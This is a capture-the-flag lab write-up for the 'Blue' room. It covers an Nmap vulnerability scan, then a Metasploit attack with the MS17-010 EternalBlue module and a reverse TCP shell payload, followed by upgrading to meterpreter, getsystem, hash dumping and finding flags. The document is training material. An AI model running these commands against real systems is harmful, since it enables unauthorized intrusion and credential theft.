# Blue
**Summary of Blue room:** Exploitation of Windows machine using MS17-010 Eternal Blue Exploit

## Recon phase
The room starts off with the recon phase where we need to gain information and the vulnerabilities which the targeted machine is vulnerable towards. 

The first question asks for the number of ports which are open with a port number of less than 1000. To find the answer, we use the following Nmap command to scan for available ports

![image](https://github.com/user-attachments/assets/fa197e7a-a273-4d6c-9e30-fd22d4fac375)

Next, the question prompts us to identify the vulnerability which the targeted machine is exposed to. To solve this question, we use the following nmap command, `nmap -sV --script vuln -v` followed by the ip address of the virtual machine.

**Nmap command breakdown:**
- `-sV` This scans for the versions of discovered services.
- `--script` Scripting Engine.
- `vuln` Investigate vulnerabilities or exploit vulnerable services.

![image](https://github.com/user-attachments/assets/de67172c-079c-4a00-b834-acaaa2fc7555)

The scan revealed that the targeted machine is vulnerable to the MS17-010 eternal blue vulnerability which exploits the Microsoft SMBv1 servers

![image](https://github.com/user-attachments/assets/37a4416c-0196-4fb7-8042-bdfc99e7a14c)

## Gaining access
The next step is to obtain access towards the targeted machine through the vulnerability found earlier on. This can be done by using Metasploit.

Firstly, we need to start metasploit by using the command, `msfconsole`

![image](https://github.com/user-attachments/assets/a98d03ce-7773-4360-af5a-ea5643ad8533)

Once metasploit is started, we shall search for the exploitation code we will run against the machine by using the command `search MS17-010` This will search all possible results containing MS17-010 vulnerability.

As the question requests for the full path code of the exploit which we will be using to exploit the targeted machine, it is `exploit/windows/smb/ms17_010_eternalblue`

![image](https://github.com/user-attachments/assets/f223a483-ba80-4545-ae65-12ecf0518a62)

Once we have identified the path code to be used to exploit the targeted machine, we need to select the option to utilize it by using the command `use` followed by the option number. In this case, the option we require is numbered 0 so we shall type `use 0`

![image](https://github.com/user-attachments/assets/36ca5e3f-031f-43a8-adb8-f62c8045ce54)

Moving on, we need to set few options to ensure that the exploit is targeted towards the required machine. The command `show options` lists down all the options which can be configured for the exploit.

![image](https://github.com/user-attachments/assets/410465e1-543f-437e-adc9-3717d97ef6cc)

Since the exploit only works with a targeted machine, we need to setup the required targeted machine to be exploited. This can be done by setting the `RHOSTS` option. To set the `RHOSTS` option, we will use the command, set RHOSTS followed by the targeted machine's ip address. In this case, it would be `set RHOSTS 10.10.16.35`

Once the targeted machine's ip address has been set, we can type in `show options` to ensure that the ip address is set correctly. The diagram below shows that the targeted machine's ip address has been set correctly, which is 10.10.16.35

![image](https://github.com/user-attachments/assets/834bc0bd-fe22-453b-b141-9e01541d361c)

Before running the exploit, we also need to change the payload option by using the command, `set payload windows/x64/shell/reverse_tcp`

![image](https://github.com/user-attachments/assets/73356649-69cb-40e8-9172-8fbee15903bd)

Once everything is setup correctly, we shall run the exploit towards the targeted machine by using the command, `exploit`

![image](https://github.com/user-attachments/assets/32354d66-8e1b-4b8a-acaf-0bd4dde5c53d)

A shell will be granted if the exploit is successful as shown below:

![image](https://github.com/user-attachments/assets/3603c027-5f7c-4016-b606-545d9ccb3f8e)

## Escalate phase
Background the shell

![image](https://github.com/user-attachments/assets/2c9a4fc8-a76b-402f-bf78-196187d658d8)

To perform more features on the targeted machine, we need to convert the shell to meterpreter shell in metasploit. We can use the following command `post/multi/manage/shell_to_meterpreter`


![image](https://github.com/user-attachments/assets/70342ff5-baa1-44cf-af27-ad4f1135e982)

use the path code and set the required options. 

![image](https://github.com/user-attachments/assets/092ad107-154d-4bdd-9c51-dcda4e5ceb95)

In this case, the shell which needs to be converted to meterpreter session has a session id of 1. Hence the session is set to 1 using the command, `set session 1`

![image](https://github.com/user-attachments/assets/0a0efb6d-edb2-4db1-9872-7f52bf3ec614)

![image](https://github.com/user-attachments/assets/6a0e09d2-aa96-4a7c-9dce-1c8715bb3c1e)

![image](https://github.com/user-attachments/assets/97feb3f5-1a59-4175-9dfb-acf044d7df47)

![image](https://github.com/user-attachments/assets/8bf03eff-8048-4f6d-a27e-fa580c44679a)

![image](https://github.com/user-attachments/assets/c2a9a798-3b49-4ffc-b403-cbfad84f2661)

Run getsystem to verify that we have escalated to NT AUTHORITY\SYSTEM.

![image](https://github.com/user-attachments/assets/80389fe7-4ef8-435a-845a-a1397c9abb7b)

![image](https://github.com/user-attachments/assets/8a7c2c26-c05a-40be-bfb5-9f7e0b44eedd)


## Cracking phase

![image](https://github.com/user-attachments/assets/b7a1f946-2d94-402e-aa77-95e7b837f87e)

Copy the hash to the text file named hash.txt using nano

![image](https://github.com/user-attachments/assets/005dfd78-d54e-4ef8-b034-751eca1c8b23)

![image](https://github.com/user-attachments/assets/5d27a3fc-8e1c-4e69-a295-fe51da1210b7)

![image](https://github.com/user-attachments/assets/cea864c7-7465-4bd3-8750-d861d577f165)






## Finding flags
### Flag 1
Based on the question, it is stated that flag 1 can be found at the system root, which is C:

![image](https://github.com/user-attachments/assets/8295c184-c850-46ca-b423-1c578cadcfc2)

### Flag 2
Based on the question, it is stated that flag 2 can be found at the location where passwords are stored within Windows. Since lsass.exe is stored in the C:\Windows\system32 which manages user credentials, we can assume flag2.txt is placed somewhere in system32 directory.

We can then use the search command to look for the file

![image](https://github.com/user-attachments/assets/5982d8b7-1e4d-4346-a8b4-47550a6d9e6b)

Once we have identified the exact location of the file, we can then navigate to the exact path to obtain the flag

![image](https://github.com/user-attachments/assets/db5c3f59-414d-4740-8b97-46fc5a9477f9)


### Flag 3
Based on the question, flag 3 can be found in the location where things are usually stored by the adminstrator. In this case, it would be the user directory. 

Once we are in the Users directory, we can examine the Documents directory for the text file containing the flag, flag3.txt

![image](https://github.com/user-attachments/assets/dfbda33f-2493-457e-882c-a0ba52de167c)
